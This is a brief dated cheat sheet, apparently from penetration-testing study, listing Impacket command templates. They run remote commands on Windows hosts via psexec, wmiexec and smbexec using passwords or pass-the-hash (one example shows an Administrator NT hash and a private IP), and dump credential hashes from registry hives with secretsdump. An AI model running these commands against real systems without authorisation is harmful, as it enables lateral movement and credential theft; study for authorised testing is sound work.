### 21-Oct-23 Sat

```
impacket-psexec domain/username:'password'@IP
```

```
impacket-psexec username@ip -hashes LM:NT
```

```
impacket-wmiexec domain/username:'password'@IP
```

```
impacket-wmiexec -hashes
00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b
Administrator@192.168.50.212
```

```
impacket-smbexec domain/username:'password'@IP
```

```
impacket-secretsdump -sam sam -security security -system system LOCAL
```



